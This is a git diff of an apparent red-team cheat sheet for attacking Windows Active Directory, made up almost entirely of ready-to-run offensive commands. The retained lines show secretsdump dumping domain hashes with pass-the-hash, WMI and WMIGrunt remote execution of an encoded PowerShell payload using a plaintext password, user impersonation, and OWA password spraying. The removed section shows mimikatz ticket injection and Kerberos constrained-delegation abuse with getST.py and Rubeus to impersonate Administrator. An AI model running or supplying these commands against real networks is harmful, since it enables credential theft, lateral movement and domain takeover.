@@ -20,12 +20,14 @@
 | python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889  -just-dc acmebank.loca/Administrator@192.168.100.10 |
 
 ```
-### 
+### Windows Management Instrumentation
+
 ```
 wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"F3rrari" process call create "powershell -enc [...snip...]"
 WMIGrunt wkstn-4945 PowerShell cyberbotic.io\n.lamb F3rrari
- WMIGrunt wkstn-4945 PowerShell
- ```
+WMIGrunt wkstn-4945 PowerShell
+
+```
   ### PowerShell Remoting
  ```
 ImpersonateUser CYBER\n.lamb
@@ -71,16 +73,4 @@ PowerShell $pass=ConvertTo-SecureString "F3rrari" -AsPlainText -Force; $cred=New
 |./atomizer.py owa contoso.com 'Fall2018' emails.txt|
 ```
 
-Then use `mimikatz` to load the ticket.
-
-### Kerberos Constrained Delegation
-```powershell
-
-mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
-Get-DomainComputer -TrustedToAuth | select -exp dnshostname #Identify
-Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo # Figure out exposed servie
-getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
-rubeus s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt #with rubeus
- 
-```
 
